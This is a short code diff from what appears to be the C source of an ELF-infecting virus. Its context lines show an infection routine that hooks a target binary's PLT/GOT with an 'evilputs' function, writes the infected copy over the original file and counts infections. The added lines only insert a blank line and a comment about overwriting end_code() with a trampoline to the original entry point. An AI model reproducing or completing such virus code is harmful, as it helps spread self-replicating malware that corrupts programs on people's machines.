@@ -757,6 +757,7 @@ infect:
 			infect_pltgot(&target, new_base + evilputs_offset + sizeof(Elf64_Ehdr));
 			unload_target(&target);
 #endif
+
 			_rename(TMP, fpath);
 			icount++;
 		}
@@ -1208,7 +1209,10 @@ unsigned long get_rip(void)
 }
 
 
-
+/*
+ * end_code() gets over-written with a trampoline
+ * that jumps to the original entry point.
+ */
 void end_code() 
 {
 	Exit(0);
